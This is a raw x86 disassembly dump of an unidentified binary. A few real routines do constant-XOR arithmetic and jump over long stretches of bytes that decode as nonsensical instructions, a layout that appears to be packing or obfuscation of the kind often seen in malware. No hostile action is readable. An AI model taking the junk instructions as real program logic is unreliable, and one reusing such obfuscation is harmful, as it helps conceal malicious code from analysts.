  40eda2:	mov    ecx,DWORD PTR [ebp-0x24]
  40eda5:	mov    edx,DWORD PTR [ebp-0x74]
  40eda8:	xor    ecx,0x6e1e
  40edae:	imul   ecx,edx
  40edb1:	mov    edx,DWORD PTR [ebp+0x8]
  40edb4:	push   0x4
  40edb6:	push   0xe4c37b20
  40edbb:	xor    eax,0x3884
  40edc0:	mov    eax,DWORD PTR [eax+edx*1]
  40edc3:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  40edca:	mov    eax,DWORD PTR [ebp-0x34]
  40edcd:	mov    edx,DWORD PTR [ebp-0xb4]
  40edd3:	lea    eax,[edx+eax*1-0x76d2]
  40edda:	mov    edx,DWORD PTR [ebp-0x44]
  40eddd:	mov    esi,DWORD PTR [ebp-0x84]
  40ede3:	or     eax,edx
  40ede5:	xor    edx,edx
  40ede7:	div    esi
  40ede9:	mov    edx,DWORD PTR [ebp-0x54]
  40edec:	add    eax,0x43d7
  40edf1:	xor    eax,0x5e6a
  40edf6:	add    eax,DWORD PTR [edx+ecx*1]
  40edf9:	mov    ecx,DWORD PTR ds:0x42273c
  40edff:	add    DWORD PTR [eax],ecx
  40ee01:	mov    eax,DWORD PTR [ebp-0x90]
  40ee07:	mov    ecx,DWORD PTR [ebp-0x8c]
  40ee0d:	mov    edx,DWORD PTR [ebp-0xa0]
  40ee13:	mov    esi,DWORD PTR [ebp-0x9c]
  40ee19:	sub    edx,eax
  40ee1b:	mov    eax,DWORD PTR [ebp-0xb0]
  40ee21:	sbb    esi,ecx
  40ee23:	mov    ecx,DWORD PTR [ebp-0xac]
  40ee29:	xor    edx,eax
  40ee2b:	mov    eax,DWORD PTR [ebp-0xc0]
  40ee31:	xor    esi,ecx
  40ee33:	mov    ecx,DWORD PTR [ebp-0xbc]
  40ee39:	add    edx,eax
  40ee3b:	adc    esi,ecx
  40ee3d:	add    edx,0x2313
  40ee43:	adc    esi,0x2a00
  40ee49:	push   esi
  40ee4a:	push   edx
  40ee4b:	call   0x422220
  40ee50:	mov    ecx,0x1207
  40ee55:	sub    ecx,eax
  40ee57:	push   0x0
  40ee59:	pop    eax
  40ee5a:	sbb    eax,edx
  40ee5c:	mov    edx,DWORD PTR ds:0x42273c
  40ee62:	xor    esi,esi
  40ee64:	jmp    0x40f1a7
  40ee69:	mov    bh,0x51
  40ee6b:	lods   eax,DWORD PTR ds:[esi]
  40ee6c:	xchg   edi,eax
  40ee6d:	mov    ebx,0x8571b7bb
  40ee72:	pop    ecx
  40ee73:	xor    ch,bl
  40ee75:	jnp    0x40eea0
  40ee77:	ss xchg edx,eax
  40ee79:	in     eax,dx
  40ee7a:	adc    bh,BYTE PTR [esi-0x413bfe42]
  40ee80:	mov    esi,0xdcaa4960
  40ee85:	cmp    esi,esi
  40ee87:	ds ss inc eax
  40ee8a:	jge    0x40ee11
  40ee8c:	fwait
  40ee8d:	pop    ebx
  40ee8e:	sub    eax,0x7c30d953
  40ee93:	aaa    
  40ee94:	mov    DWORD PTR [ebx],ebx
  40ee96:	push   ss
  40ee97:	imul   ecx,DWORD PTR [ecx+edi*4],0x5e
  40ee9b:	jp     0x40eeea
  40ee9d:	inc    ecx
  40ee9e:	popa   
  40ee9f:	outs   dx,BYTE PTR ds:[esi]
  40eea0:	mov    al,0xfd
  40eea2:	cmp    eax,0xd4ca105b
  40eea7:	dec    BYTE PTR [eax+edx*2+0x21851a96]
  40eeae:	clc    
  40eeaf:	adc    BYTE PTR [eax],ah
  40eeb1:	aam    0xa5
  40eeb3:	fisubr DWORD PTR [edi]
  40eeb5:	int3   
  40eeb6:	push   eax
  40eeb7:	lahf   
  40eeb8:	hlt    
  40eeb9:	dec    edi
  40eeba:	call   0x1bd54a0e
  40eebf:	mov    edi,0x4ef91c39
  40eec4:	pop    es
  40eec5:	push   es
  40eec6:	test   al,0x6e
  40eec8:	mov    ecx,DWORD PTR [ebx+0x1e7ae523]
  40eece:	cdq    
  40eecf:	jmp    0x4b89:0xbe441ec7
  40eed6:	mov    al,ds:0x2af7422
  40eedb:	dec    ebx
  40eedc:	adc    ah,BYTE PTR [ecx]
  40eede:	mov    al,0x70
  40eee0:	xchg   esp,eax
  40eee1:	daa    
  40eee2:	fst    st(2)
  40eee4:	shl    DWORD PTR [eax-0xfed3cd8],cl
  40eeea:	push   edx
  40eeeb:	inc    esp
  40eeec:	lock in eax,dx
  40eeee:	outs   dx,DWORD PTR ds:[esi]
  40eeef:	shr    al,cl
  40eef1:	mov    ebx,0x793a8e8c
  40eef6:	repnz outs dx,DWORD PTR ds:[esi]
  40eef8:	sbb    al,0xdd
  40eefa:	test   DWORD PTR [edx+0x39],esi
  40eefd:	aad    0xd5
  40eeff:	sub    DWORD PTR [edi+eax*1+0x2ea6864],ebp
  40ef06:	mov    ecx,0xb8a3889a
  40ef0b:	aad    0xc5
  40ef0d:	xchg   edx,eax
  40ef0e:	jae    0x40eee5
  40ef10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef11:	mov    bh,0xec
  40ef13:	rol    BYTE PTR [ebx-0xe],1
  40ef16:	adc    al,ah
  40ef18:	xchg   esp,eax
  40ef19:	adc    edx,eax
  40ef1b:	xchg   ebx,eax
  40ef1c:	sti    
  40ef1d:	xor    eax,0xfe639c06
  40ef22:	repnz data16 fisttp DWORD PTR [edi]
  40ef26:	xor    dh,BYTE PTR [eax-0x228a5140]
  40ef2c:	in     al,dx
  40ef2d:	and    al,BYTE PTR [ebx+0x3e]
  40ef30:	xor    ebx,DWORD PTR [edi]
  40ef32:	lods   al,BYTE PTR ds:[esi]
  40ef33:	push   es
  40ef34:	lods   al,BYTE PTR ds:[esi]
  40ef35:	sub    al,0xfb
  40ef37:	popa   
  40ef38:	pop    edx
  40ef39:	outs   dx,DWORD PTR ds:[esi]
  40ef3a:	in     al,0xb7
  40ef3c:	sbb    DWORD PTR [ebp+0x6b],0xffffffb4
  40ef40:	inc    esi
  40ef41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef42:	pop    ds
  40ef43:	jno    0x40eec5
  40ef45:	jmp    0x40eef9
  40ef47:	adc    dl,BYTE PTR [ebp+edx*4+0x78]
  40ef4b:	aad    0xcb
  40ef4d:	inc    eax
  40ef4e:	jnp    0x40ef8b
  40ef50:	out    0xb6,al
  40ef52:	cmp    BYTE PTR [esi-0x6b],0xd3
  40ef56:	(bad)  
  40ef57:	jmp    0x1b9b:0x4e13f94
  40ef5e:	adc    dh,BYTE PTR [eax]
  40ef60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef61:	js     0x40efb0
  40ef63:	xchg   DWORD PTR [esi+ecx*2],eax
  40ef66:	push   ds
  40ef67:	data16 fcomi st,st(7)
  40ef6a:	mov    bl,0xfd
  40ef6c:	(bad)  
  40ef6d:	daa    
  40ef6e:	adc    dh,cl
  40ef70:	xchg   DWORD PTR [eax+edi*4-0x5b23aa1d],edi
  40ef77:	and    al,dh
  40ef79:	(bad)  
  40ef7a:	xchg   edi,eax
  40ef7b:	jmp    0x83495a5
  40ef80:	pop    edi
  40ef81:	mov    eax,0xa1329907
  40ef86:	jmp    0x9b16:0x6faafaa1
  40ef8d:	inc    ebx
  40ef8e:	aad    0x52
  40ef90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef91:	out    dx,al
  40ef92:	xchg   ch,cl
  40ef94:	cmp    edx,DWORD PTR [eax+0x151ede73]
  40ef9a:	dec    ebx
  40ef9b:	or     DWORD PTR [edx],ecx
  40ef9d:	pop    ebx
  40ef9e:	and    DWORD PTR [edi+ecx*8+0x17dccb72],ebp
  40efa5:	add    al,0x75
  40efa7:	jnp    0x40efd5
  40efa9:	dec    ebp
  40efaa:	sbb    ebx,eax
  40efac:	cld    
  40efad:	imul   edi,DWORD PTR [ecx-0x67673bc2],0x7
  40efb4:	aas    
  40efb5:	(bad)  
  40efb6:	jb     0x40ef69
  40efb8:	ins    BYTE PTR es:[edi],dx
  40efb9:	push   ebp
  40efba:	mov    dl,bl
  40efbc:	cmp    edi,DWORD PTR [ebx-0xa6fa68c]
  40efc2:	aaa    
  40efc3:	daa    
  40efc4:	hlt    
  40efc5:	pop    es
  40efc6:	mov    ecx,0xb7e33c86
  40efcb:	sti    
  40efcc:	jl     0x40ef51
  40efce:	icebp  
  40efcf:	sbb    BYTE PTR [ebx],ah
  40efd1:	fs adc al,0x19
  40efd4:	push   eax
  40efd5:	sar    BYTE PTR [eax-0x2b],0xa1
  40efd9:	lea    esi,[ecx]
  40efdb:	fnstenv [ebx]
  40efdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efde:	xor    eax,0x661fad4
  40efe3:	adc    BYTE PTR [edx],ch
  40efe5:	jl     0x40f042
  40efe7:	ins    DWORD PTR es:[edi],dx
  40efe8:	ficom  DWORD PTR [ebp-0x7c1268c9]
  40efee:	mov    dh,0x5c
  40eff0:	xor    edx,DWORD PTR [edx-0x11]
  40eff3:	xchg   ebp,eax
  40eff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eff5:	or     eax,DWORD PTR [edi]
  40eff7:	xchg   ecx,eax
  40eff8:	pop    eax
  40eff9:	sub    edx,DWORD PTR [edx-0x6463d0b8]
  40efff:	pusha  
  40f000:	ja     0x78410f6c
  40f006:	jecxz  0x40efdf
  40f008:	push   ecx
  40f009:	dec    ebp
  40f00a:	cmp    edi,ecx
  40f00c:	data16 jecxz 0x40f03e
  40f00f:	repz pop esi
  40f011:	enter  0x222a,0x54
  40f015:	cli    
  40f016:	cmp    bh,BYTE PTR [esi]
  40f018:	xor    dl,BYTE PTR [edx]
  40f01a:	(bad)  
  40f01b:	pop    ds
  40f01c:	xor    ch,BYTE PTR [ecx-0x4b079d10]
  40f022:	les    ebp,FWORD PTR [edi+0x5d]
  40f025:	adc    al,0x7d
  40f027:	or     DWORD PTR [esi-0x6504a705],esi
  40f02d:	mov    eax,0xb5a6a4ce
  40f032:	jmp    0x40efb7
  40f034:	ins    BYTE PTR es:[edi],dx
  40f035:	push   ds
  40f036:	dec    ebp
  40f037:	clc    
  40f038:	shl    DWORD PTR [edx],1
  40f03a:	jl     0x40f01e
  40f03c:	mov    edx,0x96f4e830
  40f041:	ret    0x5f6b
  40f044:	lods   al,BYTE PTR ds:[esi]
  40f045:	sub    al,0x75
  40f047:	ja     0x40f041
  40f049:	mov    esi,0xd6667612
  40f04e:	sub    BYTE PTR [ebx+0x67d32c39],al
  40f054:	mov    edx,0x607d6a17
  40f059:	int3   
  40f05a:	bound  edx,QWORD PTR [ebp-0x4aa9c9fd]
  40f060:	adc    edx,esp
  40f062:	add    DWORD PTR [eax-0x44],edx
  40f065:	icebp  
  40f066:	mov    BYTE PTR [edi+ebx*2],bl
  40f069:	js     0x40f01c
  40f06b:	iret   
  40f06c:	mov    DWORD PTR [edi+0x39],edx
  40f06f:	fsubr  DWORD PTR [eax]
  40f071:	cmp    ebx,DWORD PTR [edx-0x32fb29c1]
  40f077:	pop    es
  40f078:	bound  ebp,QWORD PTR [eax-0x2]
  40f07b:	xchg   bl,bh
  40f07d:	std    
  40f07e:	fistp  DWORD PTR [ebp+0x65]
  40f081:	enter  0xe35c,0xbc
  40f085:	pop    ss
  40f086:	dec    esi
  40f087:	aad    0xa3
  40f089:	xor    edi,DWORD PTR [edx+0x13548d40]
  40f08f:	add    eax,0x3aaa268f
  40f094:	mov    ch,0xb4
  40f096:	shr    DWORD PTR [ebx-0x38],0xea
  40f09a:	mov    WORD PTR [edx-0x13dfbbbb],es
  40f0a0:	cmp    bl,BYTE PTR [esi-0x73]
  40f0a3:	sub    DWORD PTR [edx+0x3c],esp
  40f0a6:	(bad)  
  40f0a7:	mov    WORD PTR [ebx+0x28007604],?
  40f0ad:	add    ah,BYTE PTR [esi+ebx*2-0x16d54b3e]
  40f0b4:	rol    BYTE PTR [eax+0x1014c9],1
  40f0ba:	fist   DWORD PTR [ebx-0xa51ee15]
  40f0c0:	xor    al,0x24
  40f0c2:	jo     0x40f047
  40f0c4:	rol    BYTE PTR [eax+0x344f256c],0x1
  40f0cb:	xchg   esi,eax
  40f0cc:	ror    bl,cl
  40f0ce:	add    al,0xcd
  40f0d0:	add    DWORD PTR [ebp-0x5404f798],ecx
  40f0d6:	clc    
  40f0d7:	scas   eax,DWORD PTR es:[edi]
  40f0d8:	jbe    0x40f0df
  40f0da:	push   ss
  40f0db:	pop    edx
  40f0dc:	out    0xd,eax
  40f0de:	in     eax,dx
  40f0df:	jne    0x40f116
  40f0e1:	xor    BYTE PTR [edi-0x2b9d3ad1],dl
  40f0e7:	inc    edx
  40f0e8:	lods   eax,DWORD PTR ds:[esi]
  40f0e9:	retf   
  40f0ea:	sub    BYTE PTR [ebp+0x54],al
  40f0ed:	retf   
  40f0ee:	add    DWORD PTR [ecx-0x7842fe86],esi
  40f0f4:	in     al,dx
  40f0f5:	inc    ecx
  40f0f6:	retf   0x3768
  40f0f9:	dec    ecx
  40f0fa:	mov    ecx,cs
  40f0fc:	dec    edx
  40f0fd:	inc    edi
  40f0fe:	les    ebp,FWORD PTR [ecx+eax*2+0x6ad8da31]
  40f105:	stos   DWORD PTR es:[edi],eax
  40f106:	mov    ebx,0x243059ef
  40f10b:	mov    ?,WORD PTR [ecx-0x4d0c3d25]
  40f111:	sbb    ecx,edx
  40f113:	sahf   
  40f114:	push   edx
  40f115:	cwde   
  40f116:	es xchg esi,eax
  40f118:	pop    ecx
  40f119:	div    BYTE PTR fs:[ecx]
  40f11c:	xor    BYTE PTR [ebp+0x61c163d2],cl
  40f122:	enter  0x8a92,0xa7
  40f126:	daa    
  40f127:	sbb    bl,bl
  40f129:	jge    0x40f176
  40f12b:	nop
  40f12c:	dec    ecx
  40f12d:	(bad)  
  40f12e:	hlt    
  40f12f:	cmp    eax,0x98ca9a5
  40f134:	rcl    DWORD PTR [esi],cl
  40f136:	dec    ebx
  40f137:	or     eax,0xbec73027
  40f13c:	mov    cl,0x61
  40f13e:	rol    BYTE PTR [eax-0x7bcd1872],1
  40f144:	cs arpl si,si
  40f147:	mov    WORD PTR [eax+eiz*4],?
  40f14a:	inc    edi
  40f14b:	repz dec ebx
  40f14d:	es push 0x37
  40f150:	repz add al,0xf9
  40f153:	xchg   esi,eax
  40f154:	out    0xb2,al
  40f156:	dec    edx
  40f157:	(bad)  
  40f158:	into   
  40f159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f15a:	inc    eax
  40f15b:	stc    
  40f15c:	push   esp
  40f15d:	wrmsr  
  40f15f:	sbb    al,0x52
  40f161:	push   ecx
  40f162:	push   ebx
  40f163:	addr16 repz loopne 0x40f188
  40f167:	mov    dh,BYTE PTR ds:0x8bfb4af0
  40f16d:	mov    cl,0xf6
  40f16f:	retw   0x3f88
  40f173:	fisubr DWORD PTR [esi-0x42ec076e]
  40f179:	mov    dl,0xcf
  40f17b:	shl    DWORD PTR [edi],1
  40f17d:	aaa    
  40f17e:	retf   0x562b
  40f181:	dec    esp
  40f182:	fldenv [ebp-0x587fe3d8]
  40f188:	pop    esp
  40f189:	lds    esp,FWORD PTR [ecx+0x374a598c]
  40f18f:	scas   eax,DWORD PTR es:[edi]
  40f190:	push   ds
  40f191:	add    BYTE PTR [edi+0x6328e685],0xf7
  40f198:	xchg   ecx,eax
  40f199:	mov    cl,0xba
  40f19b:	(bad)  
  40f19c:	neg    bh
  40f19e:	js     0x40f161
  40f1a0:	fdiv   QWORD PTR [eax-0xf]
  40f1a3:	pop    edi
  40f1a4:	aad    0x93
  40f1a6:	lods   eax,DWORD PTR ds:[esi]
  40f1a7:	cmp    edx,ecx
  40f1a9:	jne    0x40f1dc
  40f1af:	cmp    esi,eax
  40f1b1:	jne    0x40f1dc
  40f1b7:	mov    eax,DWORD PTR [ebp-0x4]
  40f1ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f1bd:	add    eax,0x4296
  40f1c2:	shr    eax,0x2
  40f1c5:	or     eax,ecx
  40f1c7:	mov    ecx,DWORD PTR [ebp-0x10]
  40f1ca:	xor    eax,ecx
  40f1cc:	xor    eax,0x4e94
  40f1d1:	add    eax,DWORD PTR ds:0x42273c
  40f1d7:	mov    ds:0x422744,eax
  40f1dc:	pop    esi
  40f1dd:	leave  
  40f1de:	ret    0x4
  40f1e1:	push   ebp
  40f1e2:	mov    ebp,esp
  40f1e4:	sub    esp,0x58
  40f1e7:	push   ebx
  40f1e8:	push   esi
  40f1e9:	jmp    0x40f59d
  40f1ee:	jne    0x40f25e
  40f1f0:	mov    ds:0xb73caafc,al
  40f1f5:	je     0x40f1e5
  40f1f7:	fsubr  QWORD PTR [ecx+edx*8+0x3b]
  40f1fb:	cli    
  40f1fc:	fnsave ds:[ecx]
  40f1ff:	sbb    BYTE PTR [esi-0x413b1c42],bh
  40f205:	mov    esi,0x8ac68c5d
  40f20a:	jae    0x40f21b
  40f20c:	test   DWORD PTR [esi+0x3291f259],esi
  40f212:	call   0x6c41:0xbb32d1cf
  40f219:	push   edi
  40f21a:	dec    esi
  40f21b:	out    dx,eax
  40f21c:	push   es
  40f21d:	or     edi,DWORD PTR [edx-0x336b5cce]
  40f223:	and    al,BYTE PTR [esi]
  40f225:	sti    
  40f226:	push   eax
  40f227:	mov    esp,0x712ce2bd
  40f22c:	leave  
  40f22d:	mov    edx,0x508f1f09
  40f232:	sbb    ecx,DWORD PTR [esi+0x3f]
  40f235:	push   es
  40f236:	push   es
  40f237:	cmp    eax,DWORD PTR [esi+0x2b]
  40f23a:	mov    edi,0x5b214e63
  40f23f:	enter  0xb2ff,0x3d
  40f243:	test   eax,0x6cd9bc2d
  40f248:	mov    ebp,es
  40f24a:	or     cl,ah
  40f24c:	int3   
  40f24d:	aad    0x2c
  40f24f:	and    edi,ebx
  40f251:	loope  0x40f296
  40f253:	dec    eax
  40f254:	xor    ch,BYTE PTR [eax+0x289d1549]
  40f25a:	ins    DWORD PTR es:[edi],dx
  40f25b:	aas    
  40f25c:	adc    al,0xa8
  40f25e:	pushf  
  40f25f:	xor    eax,0x43415128
  40f264:	ins    BYTE PTR es:[edi],dx
  40f265:	(bad)  
  40f266:	jle    0x40f209
  40f268:	lods   al,BYTE PTR ds:[esi]
  40f269:	mov    ebx,0xee29fdf6
  40f26e:	pop    ds
  40f26f:	mov    bl,0xf9
  40f271:	repz push 0x61
  40f274:	pop    ebx
  40f275:	sti    
  40f276:	adc    al,0xf2
  40f278:	jmp    0x69446f52
  40f27d:	ds mov dh,0x34
  40f280:	inc    esp
  40f281:	lss    edx,FWORD PTR [ebp+edx*2-0x58]
  40f286:	sbb    BYTE PTR [esp+eiz*4+0x67],cl
  40f28a:	push   esi
  40f28b:	out    dx,al
  40f28c:	mov    edx,0x34d848eb
  40f291:	outs   dx,BYTE PTR ds:[esi]
  40f292:	jmp    0xd4d8:0xfbc01c04
  40f299:	add    edi,DWORD PTR [esi+0x70]
  40f29c:	fld    QWORD PTR [edi-0x6c]
  40f29f:	and    BYTE PTR [ecx+eax*1-0xa],ch
  40f2a3:	rcr    DWORD PTR [ebp+0x2c5b0cb1],1
  40f2a9:	add    bl,BYTE PTR [ecx-0x6d]
  40f2ac:	rcr    BYTE PTR [ecx],0xc7
  40f2af:	cmc    
  40f2b0:	adc    eax,0x70f1d30e
  40f2b5:	arpl   WORD PTR [esi+0x1fb394f6],bp
  40f2bb:	mov    ah,0xe8
  40f2bd:	inc    esp
  40f2be:	arpl   di,bx
  40f2c0:	nop
  40f2c1:	stos   DWORD PTR es:[edi],eax
  40f2c2:	jge    0x40f2f0
  40f2c4:	mov    ah,0xe4
  40f2c6:	jmp    0xc969:0x9ed75436
  40f2cd:	pop    ds
  40f2ce:	xor    BYTE PTR [esi-0x4abcf9f8],ah
  40f2d4:	mov    ds:0x8bb528ea,eax
  40f2d9:	jmp    0xea36dfb4
  40f2de:	xchg   ebx,eax
  40f2df:	xor    BYTE PTR [ebp+ebp*4+0x6436b480],0xa6
  40f2e7:	mov    al,ds:0x7bd8c5df
  40f2ec:	pop    ecx
  40f2ed:	and    DWORD PTR [esi+esi*8-0x23],0x0
  40f2f2:	inc    esp
  40f2f3:	gs data16 adc al,ch
  40f2f7:	(bad)  
  40f2f8:	enter  0x7d5a,0xdc
  40f2fc:	push   eax
  40f2fd:	sub    BYTE PTR [esi],ah
  40f2ff:	inc    eax
  40f300:	nop
  40f301:	daa    
  40f302:	mov    cl,0x69
  40f304:	into   
  40f305:	mov    cl,0xf3
  40f307:	dec    edx
  40f308:	adc    DWORD PTR [ecx-0x63a0fdd1],edi
  40f30e:	js     0x40f2f4
  40f310:	xchg   ecx,eax
  40f311:	fs fsub st(5),st
  40f314:	(bad)  
  40f315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f316:	dec    esp
  40f317:	sub    ebp,DWORD PTR [edi+0x51]
  40f31a:	popf   
  40f31b:	lods   al,BYTE PTR ds:[esi]
  40f31c:	jo     0x40f317
  40f31e:	pop    ecx
  40f31f:	jo     0x40f34f
  40f321:	sbb    ebp,DWORD PTR [esi]
  40f323:	push   0x3908d2f5
  40f328:	in     eax,dx
  40f329:	das    
  40f32a:	pop    ebp
  40f32b:	rcl    DWORD PTR ss:[esi+eax*4-0x7c69ffdf],0x9
  40f334:	or     DWORD PTR [eax+0x4b],0x28
  40f338:	xor    eax,0x88b082df
  40f33d:	pop    ss
  40f33e:	jo     0x40f377
  40f340:	and    esi,ebx
  40f342:	in     eax,0x51
  40f344:	int3   
  40f345:	pop    ecx
  40f346:	int    0x9
  40f348:	jb     0x40f311
  40f34a:	jl     0x40f332
  40f34c:	add    dl,dl
  40f34e:	or     esp,DWORD PTR [ecx]
  40f350:	hlt    
  40f351:	add    BYTE PTR ds:0xd84d298c,0x8f
  40f358:	pop    esp
  40f359:	inc    ecx
  40f35a:	sub    eax,0x8fb8bab1
  40f35f:	adc    edi,DWORD PTR [eax]
  40f361:	mov    ds:0x6ebe1bbd,eax
  40f366:	xor    BYTE PTR [edi-0x25],dl
  40f369:	sub    BYTE PTR [esi+ebx*8-0x66],0x24
  40f36e:	(bad)  
  40f36f:	add    eax,0x6cd2342d
  40f374:	cs or  al,0xd7
  40f377:	popf   
  40f378:	enter  0xb22c,0xa
  40f37c:	scas   eax,DWORD PTR es:[edi]
  40f37d:	aaa    
  40f37e:	mov    esi,0xa1ef2de7
  40f383:	aad    0x23
  40f385:	test   eax,0xd37438ef
  40f38a:	inc    esp
  40f38b:	loope  0x40f34a
  40f38d:	cmp    ebx,DWORD PTR [edx-0x7]
  40f390:	jno    0x40f317
  40f392:	cmp    esi,DWORD PTR [edi-0x62dfa40d]
  40f398:	ds out 0x25,al
  40f39b:	std    
  40f39c:	push   eax
  40f39d:	xchg   DWORD PTR [edx],edx
  40f39f:	(bad)  
  40f3a0:	lock pop ebx
  40f3a2:	test   BYTE PTR [ecx-0x25],ch
  40f3a5:	or     ecx,ebp
  40f3a7:	cmp    esi,DWORD PTR [eax-0x18714ba6]
  40f3ad:	inc    BYTE PTR ds:0xd4f3ae6c
  40f3b3:	es in  eax,0x7b
  40f3b6:	aaa    
  40f3b7:	aam    0x77
  40f3b9:	(bad)  
  40f3ba:	int3   
  40f3bb:	sbb    al,0x37
  40f3bd:	aaa    
  40f3be:	(bad)  
  40f3bf:	int    0x2
  40f3c1:	daa    
  40f3c2:	fcmove st,st(0)
  40f3c4:	sti    
  40f3c5:	xchg   edi,eax
  40f3c6:	push   eax
  40f3c7:	lds    si,DWORD PTR [esi-0x78]
  40f3cb:	add    al,BYTE PTR [ebp-0x20b97538]
  40f3d1:	div    DWORD PTR [esi-0x16]
  40f3d4:	cdq    
  40f3d5:	cli    
  40f3d6:	xchg   esi,eax
  40f3d7:	pop    ss
  40f3d8:	int3   
  40f3d9:	aaa    
  40f3da:	cs cmp edx,esi
  40f3dd:	icebp  
  40f3de:	popf   
  40f3df:	mov    bh,0xa7
  40f3e1:	pop    ebp
  40f3e2:	mov    al,ds:0x129def4f
  40f3e7:	xor    esp,DWORD PTR [ebx-0x62]
  40f3ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3eb:	jo     0x40f386
  40f3ed:	leave  
  40f3ee:	std    
  40f3ef:	into   
  40f3f0:	loop   0x40f42b
  40f3f2:	xchg   BYTE PTR [eax+0xf],dh
  40f3f5:	sub    al,0x3b
  40f3f7:	aaa    
  40f3f8:	or     edx,DWORD PTR [edx+0x2e2cd800]
  40f3fe:	dec    esi
  40f3ff:	mov    ecx,0x7f4a5335
  40f404:	push   ebp
  40f405:	cmp    eax,0xc7c88811
  40f40a:	mov    dh,dh
  40f40c:	adc    BYTE PTR [ecx+0x7c],0x89
  40f410:	xor    dl,dl
  40f412:	cmp    BYTE PTR [esi+0x46],bh
  40f415:	push   esi
  40f416:	jae    0x40f432
  40f418:	mov    al,ds:0xed165b00
  40f41d:	mov    eax,ds:0x50aa4268
  40f422:	gs xor cl,cl
  40f425:	mov    BYTE PTR [edi+0x6b],al
  40f428:	mov    edi,0x4a2187d8
  40f42d:	and    DWORD PTR [esi],edi
  40f42f:	or     DWORD PTR [ecx-0x1b25ce64],edi
  40f435:	shl    DWORD PTR [ebp+0x6096027a],cl
  40f43b:	sahf   
  40f43c:	test   eax,0x9b8739be
  40f441:	pop    es
  40f442:	mov    bh,0x4b
  40f444:	in     eax,0xd8
  40f446:	xchg   edx,eax
  40f447:	xor    BYTE PTR [esi-0x6aa3c148],cl
  40f44d:	or     DWORD PTR ds:0x5daec462,edi
  40f453:	mov    ebp,0x48584fce
  40f458:	enter  0x22a,0xe0
  40f45c:	iret   
  40f45d:	(bad)  
  40f45e:	mov    esp,0xb403f0f9
  40f463:	push   ss
  40f464:	scas   al,BYTE PTR es:[edi]
  40f465:	mov    dl,0x86
  40f467:	cmp    al,0x5f
  40f469:	arpl   WORD PTR [ebp-0x1f],sp
  40f46c:	js     0x40f4cc
  40f46e:	jae    0x40f444
  40f470:	inc    esi
  40f471:	push   ebp
  40f472:	inc    eax
  40f473:	or     ah,0xb0
  40f476:	inc    esi
  40f477:	aam    0x3b
  40f479:	pop    es
  40f47a:	popf   
  40f47b:	aaa    
  40f47c:	iret   
  40f47d:	repz ror eax,0xb8
  40f481:	imul   edx,ecx,0x5d8d4391
  40f487:	(bad)  
  40f488:	dec    esp
  40f489:	leave  
  40f48a:	jle    0x40f4a5
  40f48c:	mov    ebx,0xab021947
  40f491:	add    BYTE PTR [edi+ecx*2],bh
  40f494:	daa    
  40f495:	repz in eax,0x80
  40f498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f499:	out    dx,al
  40f49a:	dec    ebp
  40f49b:	mov    al,ds:0x27ac7375
  40f4a0:	pop    edx
  40f4a1:	push   ss
  40f4a2:	mov    dl,0x12
  40f4a4:	pop    ecx
  40f4a5:	jle    0x40f4bb
  40f4a7:	fcomip st,st(5)
  40f4a9:	lahf   
  40f4aa:	pushf  
  40f4ab:	aas    
  40f4ac:	push   edi
  40f4ad:	lock lds ebx,FWORD PTR [edx-0x74f47e65]
  40f4b4:	outs   dx,DWORD PTR ds:[esi]
  40f4b5:	fdiv   st(2),st
  40f4b7:	in     al,0xbd
  40f4b9:	rcr    DWORD PTR [edi+0x4b],0x3b
  40f4bd:	xor    al,0xd9
  40f4bf:	cmp    ah,BYTE PTR [ebp+0x3c]
  40f4c2:	xchg   edi,eax
  40f4c3:	sbb    eax,0xcf8e9b33
  40f4c8:	cld    
  40f4c9:	mov    al,0x22
  40f4cb:	out    0x51,eax
  40f4cd:	fistp  WORD PTR [ebx-0x231cd215]
  40f4d3:	bound  ebx,QWORD PTR [eax]
  40f4d5:	jg     0x40f51b
  40f4d7:	lods   eax,DWORD PTR ds:[esi]
  40f4d8:	pop    ss
  40f4d9:	sbb    al,0x5
  40f4db:	xchg   DWORD PTR [ecx-0x1],edx
  40f4de:	xchg   ecx,eax
  40f4df:	jae    0x40f486
  40f4e1:	test   DWORD PTR [esi+ebp*4],0xe10a1f5d
  40f4e8:	out    dx,al
  40f4e9:	shl    DWORD PTR [edx+0x30],1
  40f4ec:	hlt    
  40f4ed:	rol    BYTE PTR [ecx],1
  40f4ef:	ins    DWORD PTR es:[edi],dx
  40f4f0:	jle    0x40f552
  40f4f2:	jae    0x40f51a
  40f4f4:	sbb    al,BYTE PTR [edx]
  40f4f6:	adc    BYTE PTR [eax],bh
  40f4f8:	jno    0x40f547
  40f4fa:	push   0xb571e2f3
  40f4ff:	pop    edx
  40f500:	(bad)  
  40f501:	or     eax,0x73582388
  40f506:	loope  0x40f515
  40f508:	xchg   ebp,eax
  40f509:	pop    ebp
  40f50a:	adc    DWORD PTR [ebx+0x2],ebx
  40f50d:	out    dx,eax
  40f50e:	sti    
  40f50f:	repnz fisubr WORD PTR ds:0x7b8b86e3
  40f516:	xchg   DWORD PTR [edx+0x7f],ecx
  40f519:	bound  ecx,QWORD PTR [edx]
  40f51b:	cmp    al,0x3e
  40f51d:	pop    edx
  40f51e:	repz sbb DWORD PTR [edi-0x7f0f19fa],ebp
  40f525:	loopne 0x40f4ff
  40f527:	cmp    BYTE PTR [edi],ch
  40f529:	int3   
  40f52a:	add    DWORD PTR [eax],edi
  40f52c:	and    DWORD PTR [eax],esi
  40f52e:	inc    BYTE PTR [edi+eax*4+0x650ad9fa]
  40f535:	xlat   BYTE PTR ds:[ebx]
  40f536:	aaa    
  40f537:	outs   dx,BYTE PTR ds:[esi]
  40f538:	idiv   dl
  40f53a:	sub    esp,DWORD PTR ds:0x285c2464
  40f540:	jle    0x40f4ca
  40f542:	cmp    edi,DWORD PTR [edx]
  40f544:	dec    eax
  40f545:	cmp    BYTE PTR [ecx-0x31],bl
